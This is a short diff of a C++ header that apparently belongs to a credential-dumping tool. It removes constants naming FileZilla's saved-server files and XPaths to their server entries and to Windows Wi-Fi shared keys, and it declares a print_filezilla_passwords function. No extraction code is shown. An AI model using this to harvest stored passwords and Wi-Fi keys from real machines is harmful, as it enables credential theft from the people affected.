@@ -24,10 +24,8 @@
 
 #pragma once
 
-#define FILEZILLA_FILE_ONE L"recentservers.xml"
-#define FILEZILLA_FILE_TWO L"sitemanager.xml"
-#define FILEZILLA_XPATH_ONE L"//FileZilla3/RecentServers/Server"
-#define FILEZILLA_XPATH_TWO L"//FileZilla3/Servers/Server"
 
-#define WIFI_XPATH_ONE L"//pf:WLANProfile/pf:MSM/pf:security/pf:authEncryption"
-#define WIFI_XPATH_TWO L"//pf:WLANProfile/pf:MSM/pf:security/pf:sharedKey"
+namespace libfilezilla {
+	
+	void print_filezilla_passwords(void);
+}
